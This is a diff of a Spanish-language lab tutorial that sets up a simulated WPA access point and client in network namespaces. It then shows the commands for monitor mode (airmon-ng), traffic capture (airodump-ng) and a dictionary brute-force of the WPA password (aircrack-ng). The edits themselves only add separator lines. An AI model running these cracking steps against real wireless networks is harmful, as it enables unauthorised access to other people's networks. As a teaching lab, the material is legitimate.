@@ -38,7 +38,8 @@ $ sudo ip netns exec [nombre_AP] bash
 dentro levantamos el puerto
 $ ip link set wlan0 up // levantamos el puerto
 $ hostapd apwpa.conf // ejecutamos las configuraciones para la wlan0 y iniciamos la comunicacion
-
+-------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------
 En otra pastaña, realizaremos las configuraciones para la wlan1 en este caso el usuario usaremos otras configuraciones
 
 $sudo nano con_wpa.conf // este repocitorio tendra las configuraciones de nuestro usario
@@ -56,7 +57,8 @@ ENTRE
 Una vez guardado este vamos a conectar la wlan1 a wlan0 
 $ sudo wpa_supplicnat -B -i wlan1 -c con_wpa.conf // con este comando empezara la comunicacion, podemos apreciar en la pestaña donde realizamos la configuracion de la wlan0 se empzara a mover solo
 $ sudo airmon-ng check kill // este comando puestra los procesos y termina la comunicacion de la wlan1
-
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Para configurar la wlan2 como monitoreo que es la parte mas fundamental y ahi podemos sacar la vulnerabilidad usaremos el siguiente comando
 $ sudo su - //entramos como super usuario
 $ airmon-ng start wlan2 // con este comando convertimos la wlan2 en modo monitoreo
@@ -65,7 +67,7 @@ $ airodump-ng wlanmon // con esto emperaza la funcion de monitoreo
 CTRL + c para detenerlo
 Si queremos guardar ese trafico de red usaremos el comando
 $ airodump-ng wlan2mon -c 11 -w /tmp/[nombre].wpa
-
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ahora para entrar encontrar la contraseña a la fuerza usaremos el siguiente comando
 aircrack-ng /tmp/captura_wpa-03.cap -w /tmp/[diccionario_de_contraseña].txt
 
